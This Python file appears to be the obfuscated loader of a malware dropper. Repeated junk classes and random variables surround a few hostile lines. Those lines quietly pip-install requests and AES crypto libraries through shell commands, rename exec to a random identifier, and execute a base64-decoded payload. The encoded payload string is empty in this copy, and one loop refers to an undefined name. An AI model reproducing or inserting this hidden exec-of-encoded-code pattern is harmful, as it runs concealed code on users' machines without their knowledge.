

from sys import executable, stderr
ZZr2nkOvb3 = 40494236
["'eyvZYjT9OF'", "'f34LtBf0cs'"]
eLyWUXB5gh = 92410256
class oVK4IpBWBc:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
nJQEzx4b4r = 52228247
class Ue2XxwS9DU:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class SnnmEj9WwH:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'Ua4xaiO', 'age': 33}
class ym9sCwI1uX:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class P4qORFb8R9:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class hPncNMhdlW:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
MKUoa0jRLe = 67997766
class DnSXl8YXGB:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'zxzqVR27Vf'
class vLVYudbMhM:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
SIm4Oag3nt = 88860808
JsyNTnj2qr = 99723260
class urx0tZmqUM:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
U9CzoKNVFI = 73981854
class iV3EZSjaMM:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
MUH744gaCS = 67144389
U5XAIw8JDW = 40984312
aeTa021BDX = 14530483
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
ZZr2nkOvb3 = 40494236
["'eyvZYjT9OF'", "'f34LtBf0cs'"]
eLyWUXB5gh = 92410256
class oVK4IpBWBc:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
nJQEzx4b4r = 52228247
class Ue2XxwS9DU:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class SnnmEj9WwH:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'Ua4xaiO', 'age': 33}
class ym9sCwI1uX:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class P4qORFb8R9:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class hPncNMhdlW:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
MKUoa0jRLe = 67997766
class DnSXl8YXGB:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'zxzqVR27Vf'
class vLVYudbMhM:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
SIm4Oag3nt = 88860808
JsyNTnj2qr = 99723260
class urx0tZmqUM:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
U9CzoKNVFI = 73981854
class iV3EZSjaMM:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
MUH744gaCS = 67144389
U5XAIw8JDW = 40984312
aeTa021BDX = 14530483
q6xqkWdmKsmvJZSew8s1JmgenYdec5uJACbpPQ = exec
ZZr2nkOvb3 = 40494236
["'eyvZYjT9OF'", "'f34LtBf0cs'"]
eLyWUXB5gh = 92410256
class oVK4IpBWBc:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
nJQEzx4b4r = 52228247
class Ue2XxwS9DU:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class SnnmEj9WwH:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'Ua4xaiO', 'age': 33}
class ym9sCwI1uX:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class P4qORFb8R9:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class hPncNMhdlW:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
MKUoa0jRLe = 67997766
class DnSXl8YXGB:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'zxzqVR27Vf'
class vLVYudbMhM:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
SIm4Oag3nt = 88860808
JsyNTnj2qr = 99723260
class urx0tZmqUM:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
U9CzoKNVFI = 73981854
class iV3EZSjaMM:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
MUH744gaCS = 67144389
U5XAIw8JDW = 40984312
aeTa021BDX = 14530483
import concurrent.futures
RnKJRQqKMEwPuDxpmJabC7AJDAk0NnMcobrpcu=""
q6xqkWdmKsmvJZSew8s1JmgenYdec5uJACbpPQ(base64.b64decode(RnKJRQqKMEwPuDxpmJabC7AJDAk0NnMcobrpcu))
ZZr2nkOvb3 = 40494236
["'eyvZYjT9OF'", "'f34LtBf0cs'"]
eLyWUXB5gh = 92410256
class oVK4IpBWBc:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
nJQEzx4b4r = 52228247
class Ue2XxwS9DU:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class SnnmEj9WwH:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'Ua4xaiO', 'age': 33}
class ym9sCwI1uX:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class P4qORFb8R9:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class hPncNMhdlW:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
MKUoa0jRLe = 67997766
class DnSXl8YXGB:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'zxzqVR27Vf'
class vLVYudbMhM:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
SIm4Oag3nt = 88860808
JsyNTnj2qr = 99723260
class urx0tZmqUM:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
U9CzoKNVFI = 73981854
class iV3EZSjaMM:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
MUH744gaCS = 67144389
U5XAIw8JDW = 40984312
aeTa021BDX = 14530483
